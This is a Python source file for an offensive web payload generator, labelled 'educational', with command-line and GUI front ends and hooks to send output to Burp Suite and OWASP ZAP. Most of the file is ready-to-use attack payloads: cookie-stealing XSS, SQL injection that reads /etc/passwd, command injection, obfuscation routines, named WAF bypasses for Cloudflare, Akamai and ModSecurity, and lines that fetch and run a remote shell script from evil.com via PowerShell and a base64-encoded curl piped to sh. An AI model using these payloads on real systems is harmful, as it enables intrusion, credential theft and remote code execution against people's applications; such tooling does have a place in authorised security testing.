#!/usr/bin/env python3
"""
Custom Payload Generator for Web Exploitation (Educational Use Only)
"""
import argparse
import sys
import json
import base64
import random
import string
from enum import Enum
import requests
import pyperclip
import tkinter as tk
from tkinter import ttk, scrolledtext, filedialog

# ======================
# ENUMERATIONS
# ======================
class PayloadType(Enum):
    XSS = 1
    SQL_INJECTION = 2
    COMMAND_INJECTION = 3

# ======================
# ENCODING & OBFUSCATION
# ======================
class Encoder:
    @staticmethod
    def encode(payload, method):
        """Encode payload using specified method"""
        if method == "base64":
            return base64.b64encode(payload.encode()).decode()
        elif method == "url":
            return ''.join(f'%{ord(c):02X}' if c not in '-_.~' else c for c in payload)
        elif method == "hex":
            return ''.join(f'\\x{ord(c):02x}' for c in payload)
        elif method == "unicode":
            return ''.join(f'\\u{ord(c):04x}' for c in payload)
        return payload

    @staticmethod
    def obfuscate(payload, level=1):
        """Obfuscate payload with increasing complexity"""
        # Level 1: Random case
        if level >= 1:
            payload = ''.join(
                c.upper() if random.random() > 0.5 else c.lower()
                for c in payload
            )
        
        # Level 2: Insert comments and whitespace
        if level >= 2:
            words = payload.split()
            for i in range(len(words)):
                if random.random() > 0.7:
                    # Insert random comment
                    words[i] += f"/**{''.join(random.choices(string.ascii_letters, k=3))}*/"
                if random.random() > 0.6:
                    # Add random whitespace
                    words[i] = ' '.join(words[i])
            payload = ' '.join(words)
        
        # Level 3: Advanced obfuscation
        if level >= 3:
            # Insert null bytes
            if random.random() > 0.8:
                pos = random.randint(1, len(payload)-1)
                payload = payload[:pos] + '\u0000' + payload[pos:]
            
            # Add junk parameters
            if '?' in payload:
                payload += '&' + ''.join(random.choices(string.ascii_lowercase, k=3)) + '=' + str(random.randint(1,100))
        
        return payload

# ======================
# PAYLOAD GENERATION
# ======================
class PayloadGenerator:
    def generate(self, payload_type, technique=None, bypass=False, os_type="linux"):
        if payload_type == PayloadType.XSS:
            return self._generate_xss(technique, bypass)
        elif payload_type == PayloadType.SQL_INJECTION:
            return self._generate_sqli(technique, bypass)
        elif payload_type == PayloadType.COMMAND_INJECTION:
            return self._generate_cmdi(os_type, bypass)
        else:
            raise ValueError("Invalid payload type")

    def _generate_xss(self, technique, bypass):
        payloads = []
        
        # Base payloads
        base_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert(1)>",
            "<body onload=alert(document.cookie)>"
        ]
        
        # Technique-specific payloads
        if technique == "dom":
            payloads.extend([
                "<svg onload=alert(1)>",
                "javascript:alert(document.domain)",
                "#<script>alert(1)</script>"
            ])
        elif technique == "stored":
            payloads.extend([
                "<script>fetch('/steal?cookie='+document.cookie)</script>",
                "<link rel=stylesheet href='javascript:alert(1)'>"
            ])
        else:  # reflected/default
            payloads.extend(base_payloads)
        
        # Bypass techniques
        if bypass:
            payloads.extend([
                "<img src=x:g onerror=\"eval(atob('YWxlcnQoJ1hTUycp'))\">",  # Base64 encoded
                "<svg><script>alert&#40;1&#41;</script>",
                "<img src='x'onerror='alert`1`'>",  # Backticks
                "<iframe srcdoc='<script>alert(1)</script>'>",
                "<script/*>alert(1)</script/*>",  # Comment bypass
                "<script>\u0000alert(1)</script>",  # Null byte
                "<a href=\"javascript:alert`${document.domain}`\">click</a>"
            ])
        
        return payloads

    def _generate_sqli(self, technique, bypass):
        payloads = []
        
        # Technique-specific payloads
        if technique == "error":
            payloads.extend([
                "' OR 1=1 -- ",
                "\" OR \"a\"=\"a",
                "' OR SLEEP(5) -- ",
                "' AND EXTRACTVALUE(rand(),CONCAT(0x3a,version())) -- "
            ])
        elif technique == "blind":
            payloads.extend([
                "' AND 1=IF(SUBSTR(version(),1,1)='5',SLEEP(5),0) -- ",
                "' OR ASCII(SUBSTR((SELECT user),1,1))=114 -- ",
                "' AND SELECT SUBSTRING(password,1,1) FROM users='a"
            ])
        else:  # union/default
            payloads.extend([
                "' UNION SELECT null,version() -- ",
                "' UNION SELECT user(),database() -- ",
                "' UNION SELECT @@version,LOAD_FILE('/etc/passwd') -- "
            ])
        
        # Bypass techniques
        if bypass:
            payloads.extend([
                "id=1'/*!50000UNION*//*!50000SELECT*/ 1,2,3-- -",  # MySQL versioned comments
                "id=1'%0a/**/UNION/**/%0aSELECT/**/1,2,3--+",  # Whitespace
                "id=1' uNiOn aLl sElEcT 1,2,3-- -",  # Case variation
                "' OR 1=1 /*!0aNd*/ '1'='1",  # Keyword splitting
                "' UNION SELECT 1,2,3 FROM DUAL WHERE 1=1 AND 1=0-- -",  # Dual table
                "'||(SELECT 0x4F525C4B)||'"  # Hex encoding
            ])
        
        return payloads

    def _generate_cmdi(self, os_type, bypass):
        payloads = []
        
        # OS-specific payloads
        if os_type == "windows":
            payloads.extend([
                "& whoami",
                "| net user",
                "&& ipconfig /all",
                "%ComSpec% /c whoami"
            ])
        else:  # linux
            payloads.extend([
                ";id",
                "&& whoami",
                "| cat /etc/passwd",
                "`echo bHM= | base64 -d`"  # Encoded 'ls'
            ])
        
        # Bypass techniques
        if bypass:
            if os_type == "windows":
                payloads.extend([
                    "powershell iex (New-Object Net.WebClient).DownloadString('http://evil.com/shell.ps1')",
                    "cmd /c \"set /p=whoami\"<NUL",  # No space
                    "mshta javascript:alert(1);close();",  # HTA execution
                    "wmic process call create calc.exe"  # WMIC bypass
                ])
            else:
                payloads.extend([
                    "${IFS}whoami",  # Internal Field Separator
                    "who\"am\"i",  # Quote bypass
                    "w'h'o'a'm'i",  # Character separation
                    "echo${IFS}Y3VybCBodHRwOi8vZXZpbC5jb20vc2hlbGwuc2g=|base64${IFS}-d|sh",  # Encoded payload
                    "awk 'BEGIN {system(\"whoami\")}'"  # Alternative command
                ])
        
        return payloads

# ======================
# API INTEGRATION
# ======================
class BurpSuiteAPI:
    def __init__(self, base_url="http://localhost:8080"):
        self.base_url = base_url.rstrip('/')
    
    def send_to_repeater(self, payload):
        """Send payload to Burp Repeater"""
        # This is a simplified example - real implementation would use Burp's REST API
        try:
            response = requests.post(
                f"{self.base_url}/burp/repeater",
                json={"payload": payload},
                headers={"Content-Type": "application/json"}
            )
            response.raise_for_status()
            return True
        except Exception:
            return False

class ZapAPI:
    def __init__(self, base_url="http://localhost:8090"):
        self.base_url = base_url.rstrip('/')
        self.api_key = "your-zap-api-key"  # Should be configured in ZAP
    
    def send_to_active_scanner(self, payload):
        """Send payload to ZAP Active Scanner"""
        try:
            response = requests.get(
                f"{self.base_url}/JSON/ascan/action/scan/",
                params={
                    "url": f"http://example.com/vuln?input={payload}",
                    "apikey": self.api_key
                }
            )
            response.raise_for_status()
            return True
        except Exception:
            return False

# ======================
# WAF BYPASS TESTS
# ======================
def get_waf_bypass_tests(payload_type):
    tests = {
        "xss": [
            # Cloudflare XSS bypasses
            "<svg/onload=alert(1)>",
            "<script>alert(1)</script​>",  # Zero-width space
            "<img src=x oneonerrorrror=alert(1)>",
            
            # Akamai bypasses
            "<a href=\"javascript:alert(1)\">click</a>",
            "<img src=\"x:g\" onerror=\"eval('al'+'ert(1)')\">",
            
            # ModSecurity CRS bypasses
            "<script>/*!*/alert/*!*/(1)</script>",
            "<img src=x onerror\r\n=alert(1)>"
        ],
        "sqli": [
            # Cloudflare SQLi bypasses
            "1' UNI/**/ON SEL/**/ECT 1,2,3-- -",
            "1' AND 1=0x1/*",
            
            # Akamai bypasses
            "1' OR 'a'='a'--",
            "1' UNION SELECT NULL,@@version,NULL--",
            
            # ModSecurity CRS bypasses
            "1' /*!50000UNION*/ /*!50000SELect*/ 1,2,3-- -",
            "1' AND (SELECT 1 FROM (SELECT SLEEP(5))a) -- "
        ],
        "cmdi": [
            # Command separator bypasses
            "sleep${IFS}5",  # Linux
            "ping${IFS}-n${IFS}5${IFS}127.0.0.1",  # Windows
            
            # Blacklist evasion
            "who''ami",  # Linux
            "who\"am\"i",  # Linux
            "who^ami",  # Windows
            "w'h'o'a'm'i",  # Linux
            
            # Encoding bypasses
            "echo${IFS}Y2F0IC9ldGMvcGFzc3dk|base64${IFS}-d|sh",  # Linux
            "certutil -decode encoded.txt cmd.bat & cmd.bat"  # Windows
        ]
    }
    return tests.get(payload_type, [])

# ======================
# CLI INTERFACE
# ======================
def cli_main():
    parser = argparse.ArgumentParser(
        description="Advanced Payload Generator WAFBreaker",
        epilog="Example: ./main.py --type xss --technique dom --bypass --encode base64 --obfuscate 2 --output json"
    )
    
    # Payload configuration
    parser.add_argument("--type", choices=["xss", "sqli", "cmdi"], required=True, help="Payload type")
    parser.add_argument("--technique", help="Technique variant (e.g., reflected, union, linux)")
    parser.add_argument("--bypass", action="store_true", help="Include WAF bypass techniques")
    parser.add_argument("--os", choices=["linux", "windows"], default="linux", help="OS for command injection")
    
    # Output processing
    parser.add_argument("--encode", choices=["base64", "url", "hex", "unicode"], help="Encoding method")
    parser.add_argument("--obfuscate", type=int, choices=range(0,4), default=0, help="Obfuscation level (0-3)")
    parser.add_argument("--output", choices=["cli", "json", "clipboard"], default="cli", help="Output format")
    
    # API integration
    parser.add_argument("--burp", metavar="URL", help="Send to Burp Suite Repeater (http://localhost:8080)")
    parser.add_argument("--zap", metavar="URL", help="Send to OWASP ZAP (http://localhost:8090)")
    
    args = parser.parse_args()
    
    try:
        # Map payload types
        payload_map = {
            "xss": PayloadType.XSS,
            "sqli": PayloadType.SQL_INJECTION,
            "cmdi": PayloadType.COMMAND_INJECTION
        }
        
        generator = PayloadGenerator()
        payloads = generator.generate(
            payload_type=payload_map[args.type],
            technique=args.technique,
            bypass=args.bypass,
            os_type=args.os
        )
        
        # Process payloads
        if args.encode:
            payloads = [Encoder.encode(p, args.encode) for p in payloads]
        if args.obfuscate > 0:
            payloads = [Encoder.obfuscate(p, args.obfuscate) for p in payloads]
        
        # Output handling
        if args.output == "json":
            print(json.dumps({"payloads": payloads}, indent=2))
        elif args.output == "clipboard":
            try:
                pyperclip.copy('\n'.join(payloads))
                print("[+] Payloads copied to clipboard!")
            except Exception as e:
                print(f"[-] Clipboard copy failed: {str(e)}")
        else:  # CLI output
            print("\nGenerated Payloads:")
            for i, p in enumerate(payloads, 1):
                print(f"{i}. {p}")
        
        # API integration
        if args.burp:
            burp = BurpSuiteAPI(args.burp)
            success_count = sum(1 for p in payloads if burp.send_to_repeater(p))
            print(f"\n[+] Sent {success_count}/{len(payloads)} payloads to Burp Suite")
            
        if args.zap:
            zap = ZapAPI(args.zap)
            success_count = sum(1 for p in payloads if zap.send_to_active_scanner(p))
            print(f"\n[+] Sent {success_count}/{len(payloads)} payloads to ZAP")
            
    except Exception as e:
        print(f"Error: {str(e)}", file=sys.stderr)
        sys.exit(1)

# ======================
# GUI INTERFACE
# ======================
def gui_main():
    """Simple Tkinter GUI for payload generation"""
    root = tk.Tk()
    root.title("Payload Generator")
    root.geometry("800x600")
    
    # Store payloads for export
    current_payloads = []
    
    # Configuration frame
    config_frame = ttk.LabelFrame(root, text="Payload Configuration")
    config_frame.pack(fill="x", padx=10, pady=5)
    
    ttk.Label(config_frame, text="Type:").grid(row=0, column=0, padx=5, pady=5)
    payload_type = ttk.Combobox(config_frame, values=["XSS", "SQL Injection", "Command Injection"])
    payload_type.grid(row=0, column=1, padx=5, pady=5)
    payload_type.current(0)
    
    ttk.Label(config_frame, text="Technique:").grid(row=0, column=2, padx=5, pady=5)
    technique = ttk.Entry(config_frame)
    technique.grid(row=0, column=3, padx=5, pady=5)
    
    bypass_var = tk.BooleanVar()
    ttk.Checkbutton(config_frame, text="WAF Bypass", variable=bypass_var).grid(row=0, column=4, padx=5, pady=5)
    
    # Encoding options
    encode_frame = ttk.LabelFrame(root, text="Encoding & Obfuscation")
    encode_frame.pack(fill="x", padx=10, pady=5)
    
    ttk.Label(encode_frame, text="Encode:").grid(row=0, column=0, padx=5, pady=5)
    encode_method = ttk.Combobox(encode_frame, values=["None", "Base64", "URL", "Hex", "Unicode"])
    encode_method.grid(row=0, column=1, padx=5, pady=5)
    encode_method.current(0)
    
    ttk.Label(encode_frame, text="Obfuscate:").grid(row=0, column=2, padx=5, pady=5)
    obfuscate_level = ttk.Scale(encode_frame, from_=0, to=3, orient="horizontal")
    obfuscate_level.grid(row=0, column=3, padx=5, pady=5)
    obfuscate_level.set(0)
    obfuscate_label = ttk.Label(encode_frame, text="0")
    obfuscate_label.grid(row=0, column=4, padx=5, pady=5)
    
    # Update label when slider moves
    def update_obfuscate_label(_):
        obfuscate_label.config(text=str(int(obfuscate_level.get())))
    obfuscate_level.bind("<Motion>", update_obfuscate_label)
    
    # Output frame
    output_frame = ttk.LabelFrame(root, text="Generated Payloads")
    output_frame.pack(fill="both", expand=True, padx=10, pady=5)
    
    output_area = scrolledtext.ScrolledText(output_frame, wrap=tk.WORD)
    output_area.pack(fill="both", expand=True, padx=5, pady=5)
    
    def generate_payloads():
        """Generate and display payloads"""
        nonlocal current_payloads
        try:
            # Clear previous output
            output_area.delete(1.0, tk.END)
            
            # Map payload types
            type_map = {
                "XSS": PayloadType.XSS,
                "SQL Injection": PayloadType.SQL_INJECTION,
                "Command Injection": PayloadType.COMMAND_INJECTION
            }
            
            generator = PayloadGenerator()
            current_payloads = generator.generate(
                payload_type=type_map[payload_type.get()],
                technique=technique.get() or None,
                bypass=bypass_var.get()
            )
            
            # Apply encoding
            if encode_method.get() != "None":
                enc_map = {
                    "Base64": "base64",
                    "URL": "url",
                    "Hex": "hex",
                    "Unicode": "unicode"
                }
                current_payloads = [Encoder.encode(p, enc_map[encode_method.get()]) for p in current_payloads]
            
            # Apply obfuscation
            level = int(obfuscate_level.get())
            if level > 0:
                current_payloads = [Encoder.obfuscate(p, level) for p in current_payloads]
            
            # Display results
            output_area.insert(tk.END, "Generated Payloads:\n\n")
            for i, p in enumerate(current_payloads, 1):
                output_area.insert(tk.END, f"{i}. {p}\n")
                
        except Exception as e:
            output_area.insert(tk.END, f"Error: {str(e)}")
    
    def copy_to_clipboard():
        """Copy contents to clipboard"""
        try:
            content = output_area.get(1.0, tk.END)
            pyperclip.copy(content)
            output_area.insert(tk.END, "\n\n[+] Payloads copied to clipboard!")
        except Exception as e:
            output_area.insert(tk.END, f"\n\n[-] Clipboard copy failed: {str(e)}")
    
    def export_json():
        """Export payloads to JSON file"""
        if not current_payloads:
            output_area.insert(tk.END, "\n\n[!] No payloads to export. Generate first.")
            return
            
        file_path = filedialog.asksaveasfilename(
            defaultextension=".json",
            filetypes=[("JSON files", "*.json")]
        )
        if file_path:
            try:
                with open(file_path, 'w') as f:
                    json.dump({"payloads": current_payloads}, f, indent=2)
                output_area.insert(tk.END, f"\n\n[+] Exported {len(current_payloads)} payloads to {file_path}")
            except Exception as e:
                output_area.insert(tk.END, f"\n\n[-] Export failed: {str(e)}")

    # Action buttons
    button_frame = ttk.Frame(root)
    button_frame.pack(fill="x", padx=10, pady=10)
    
    ttk.Button(button_frame, text="Generate", command=generate_payloads).pack(side="left", padx=5)
    ttk.Button(button_frame, text="Copy to Clipboard", command=copy_to_clipboard).pack(side="left", padx=5)
    ttk.Button(button_frame, text="Export JSON", command=export_json).pack(side="left", padx=5)
    ttk.Button(button_frame, text="Exit", command=root.destroy).pack(side="right", padx=5)
    
    root.mainloop()

# ======================
# MAIN EXECUTION
# ======================
if __name__ == "__main__":
    if len(sys.argv) > 1:
        cli_main()
    else:
        gui_main()
